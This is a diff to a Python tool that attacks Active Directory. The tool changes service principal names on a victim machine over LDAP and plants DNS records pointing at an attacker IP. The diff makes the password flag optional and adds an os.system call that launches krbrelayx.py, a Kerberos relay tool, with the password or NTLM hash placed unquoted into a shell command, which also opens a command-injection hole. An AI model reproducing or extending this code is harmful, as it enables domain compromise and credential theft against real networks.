@@ -206,7 +206,7 @@ def SET_SPN_ForMachine(CONNECTION_BIND, LDAP_SERVER_HANDLE, HOSTNAME_VICTIM, SPN
         print_o('Found modification target')
     except IndexError:
         print_f('Target not found!')
-        return
+        return False
 
 
     """Set the action we are going to peform on this LDAP field"""
@@ -318,7 +318,7 @@ def main():
     parser.add_argument("host", metavar='HOSTNAME', help="Hostname/ip or ldap://host:port connection string to connect to")
     # Positional Argument
     parser.add_argument("-u", "--user", metavar='USERNAME', help="DOMAIN\\username for authentication", required=True)
-    parser.add_argument("-p", "--password", metavar='PASSWORD', help="Password or LM:NTLM hash, will prompt if not specified", required=True)
+    parser.add_argument("-p", "--password", metavar='PASSWORD', help="Password or LM:NTLM hash, will prompt if not specified")
 
 
     # Optional
@@ -357,9 +357,11 @@ def main():
 
 
 
-#####################################################################################################
-    # """The below line is for debugging, it will remove all SPNs from the victim machine"""
+# ####################################################################################################
+#     """The below 4 lines is for debugging, it will remove all SPNs from the victim machine"""
 
+    # SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, action=CLEAR)
+    # DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, ATTACKER_MACHINE, ATTACKER_IP, LDAP_SERVER_IP, ACTION=REMOVE_RECORD)
     # SET_SPN_ForMachine(CONNECTION_BIND_RETURN, LDAP_HANDLE, HOSTNAME_VICTIM, action=CLEAR)
     # DNSRecordModfier(CONNECTION_BIND_RETURN, LDAP_HANDLE, ATTACKER_MACHINE, ATTACKER_IP, LDAP_SERVER_IP, ACTION=REMOVE_RECORD)
 
@@ -383,6 +385,8 @@ def main():
     print_m("Saving statefile of changes: %s" % statename)
     with open(statename,"w+") as FILE:
         FILE.write(json.dumps(current_state_JSON)) 
+
+    os.system("x-terminal-emulator -e python3 krbrelayx.py -hashes %s" % PASSWORD)
 
         
 if __name__ == "__main__":
